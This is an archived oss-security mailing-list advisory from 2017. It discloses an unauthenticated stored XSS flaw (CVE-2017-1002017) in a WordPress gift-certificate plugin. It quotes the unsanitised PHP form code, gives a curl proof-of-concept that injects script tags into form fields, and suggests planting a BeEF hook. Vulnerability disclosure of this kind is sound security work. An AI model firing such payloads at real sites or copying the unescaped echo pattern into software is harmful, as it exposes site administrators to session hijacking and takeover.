X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3692" "Friday" "2" "June" "2017" "13:45:49" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<1FF6A1D9-4F53-40F3-A9E5-0E7AA03F82A6@me.com>" "79" "[oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0" "^Date:" nil nil "6" "2017060217:45:49" "[oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0" (number mark "U       larry0@me.co Jun  2   79/3692  " thread-indent "\"[oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25623 invoked by uid 550); 2 Jun 2017 17:46:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 25605 invoked from network); 2 Jun 2017 17:46:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1496425552; bh=Y5Z5oeqAMBuCkXQXqBVnZ41qy1+BTJQXDAACw07800M=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=RaDUi2R0pMhGI2Ju7kacbxUkP4uCzlPmimBo79Nwt0OA0kyYQZYQokQeS0bSfl4MY
 /tJsnVJnd//vbpw4IBhh1kCL+hs10FSLMezARCvXRSuNI2H8ZEj3A8XBjb865BNoms
 8k+h9lBdTQgyXe/2zKnbUeZMJ9HIzwocQTHRot3HW+6o/Vv3iAc4WcxxdM1ToBsP+J
 IiKl22EysFhontY615ils9YVOu6YSON4281lOtvcZkra69msOHKPEnccJdIlXEs03w
 cp53gumfthax95fVWHrhoLSBIIRkrGFE5wsvReTlemt4+YbgRLWVEH0W6K/zy/YXYB
 vHoMrLFrf2X8g==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-06-02_09:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1706020315
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <1FF6A1D9-4F53-40F3-A9E5-0E7AA03F82A6@me.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Date: Fri, 02 Jun 2017 13:45:49 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin
 gift-certificate-creator v1.0
To: Open Source Security <oss-security@lists.openwall.com>

Title: Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-ce=
rtificate-creator v1.0
Author: Larry W. Cashdollar, @_larry0
Date: 2017-05-15
CVE-ID:[CVE-2017-1002017]
Download Site: https://wordpress.org/plugins/gift-certificate-creator/
Vendor: Bob Cares https://bobcares.com/
Vendor Notified: 2017-05-17
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D191
Description: Gift Certificate Creator WordPress plugin allows you to manage=
 gift certificates on your website. In a convenient front-end UI provided b=
y this plugin, your site visitors can enter the amount and user details. On=
 form submission, the user details will be sent to the administrator. Also,=
 the administrator can view the list of all the certificate requests.
Vulnerability:
Publically accessible pages that are using the shortcode =E2=80=98[gift_cer=
tificate_form]=E2=80=99 allow any user to add gift certificate entries into=
 the database.  These entries are listed by the Wordpress administrator whe=
n visiting the plugin admin page.  This action is performed by gc-list.php =
which doesn't sanitize the entries before
displaying them.   This allows malicious javascript to be injected into the=
 WordPress database.=20


In file giftcertificates.php=20
141:    if ($_REQUEST['action'] =3D=3D 'Submit') {
144:        //if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_=
number']) && !empty($_REQUEST['cc_sec_code'])) {
145:   		if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_sec_c=
ode'])) {
147:            $gcmObj->createNewGCM($_REQUEST);
149:            writeLog(" amount ".$_REQUEST['cert_amount']." and email ".=
$_REQUEST['cc_sec_code']." are posted successfully", basename(__LINE__), ba=
sename(__FILE__));
152:            $gcmObj->sendGCMReportEmail(GC_MAIL_TO, GC_MAIL_FROM, GC_MA=
IL_SUBJECT, $_REQUEST);
153:            $_REQUEST =3D array();
212-    <form method=3D"get" name=3D"gc_form" action=3D"">
213-        <table class=3D'gc_form'>
214-            <tr>
215-                <th>Certificate Amount:</th>
216:                <td><input type=3D"text" name=3D"cert_amount" value=3D"=
<?php echo $_REQUEST['cert_amount']; ?>" placeholder =3D"$"></td>
217-            </tr>
218-            <tr>
219-                <th>Your Name:</th>
220:                <td><input type=3D"text" name=3D"user_name" value=3D"<?=
php echo $_REQUEST['user_name']; ?>"> (optional)</td>
221-            </tr>
222-            <tr>
223-                <th>Recipient Name:</th>
224:                <td><input type=3D"text" name=3D"receip_name" value=3D"=
<?php echo $_REQUEST['receip_name']; ?>"> (optional)</td>
225-            </tr>
226-            <tr>
227-                <th>Recipient Email:</th>
228:                <td><input type=3D"text" name=3D"cc_sec_code" value=3D"=
<?php echo $_REQUEST['cc_sec_code']; ?>"></td>
229-            </tr>
230-            <tr>
231-                <th>Recipient Address:</th>
232:                <td><textarea name=3D"receip_address" value=3D"<?php ec=
ho $_REQUEST['receip_address']; ?>"></textarea>
233-            </tr>
234-            <tr>
235-                <td colspan=3D"2" style=3D"text-align: center;"><input =
type=3D"submit" value=3D"Submit" name=3D"action"></td>
236-            </tr>
237-        </table>

Exploit Code:
	=E2=80=A2 $ curl http://example/index.php/2017/05/16/gift-certificates/?ce=
rt_amount=3D50&user_name=3D%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E=
&receip_name=3D%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&cc_sec_code=
=3Dno%40me.net&receip_address=3D%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscri=
pt%3E&action=3DSubmit

Notes: Inject a BeEF hook even.=
